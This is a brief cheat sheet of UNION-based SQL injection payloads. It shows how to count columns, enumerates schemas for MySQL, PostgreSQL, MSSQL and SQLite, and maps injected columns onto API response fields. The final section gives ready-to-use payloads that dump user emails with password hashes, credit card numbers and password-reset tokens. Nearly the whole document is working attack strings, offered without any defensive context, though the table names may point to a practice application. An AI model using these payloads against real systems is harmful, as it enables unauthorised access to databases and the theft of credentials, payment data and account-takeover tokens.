# UNION-Based SQL Injection

## Summary
Extract data using UNION SELECT from other tables.

## Column Counting

```sql
# ORDER BY (slow for many cols)
' ORDER BY 1-- -    → 200 OK
' ORDER BY N-- -    → 500 error = N-1 columns

# Sequential UNION probe (faster for REST APIs)
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
# When API returns data (not error) → column count found

# Key indicator for JSON APIs:
# "data": [] with UNION = wrong column count
# "data": [...] with UNION data = correct column count
```

## DBMS-Specific Payloads

### MySQL
```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
```

### PostgreSQL
```sql
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,tablename,3 FROM pg_tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
```

### MSSQL
```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
```

### SQLite
```sql
' UNION SELECT 1,sqlite_version(),3,4,5,6,7-- -
' UNION SELECT 1,tbl_name,3,4,5,6,7 FROM sqlite_master-- -
' UNION SELECT 1,email,password,4,5,6,7 FROM Users-- -
```

## Determining Column Positions
```
Data appears in specific response fields.
Map UNION column positions to response fields:

Union SELECT 1,email,password,4,5,6,7 FROM Users--
             ↑       ↑       ↑
         name/id  desc/name  price/desc
```

## Data Extraction Examples

```sql
# List tables
' UNION SELECT 1,tbl_name,3,4,5,6,7,8,9 FROM sqlite_master-- -

# Dump emails + password hashes
' UNION SELECT 1,email,password,4,5,6,7,8,9 FROM Users-- -

# Dump credit cards
' UNION SELECT 1,cardNumber,3,4,5,6,7,8,9 FROM CreditCards-- -

# Dump reset tokens
' UNION SELECT 1,email,resetToken,4,5,6,7,8,9 FROM Users WHERE resetToken IS NOT NULL-- -
```
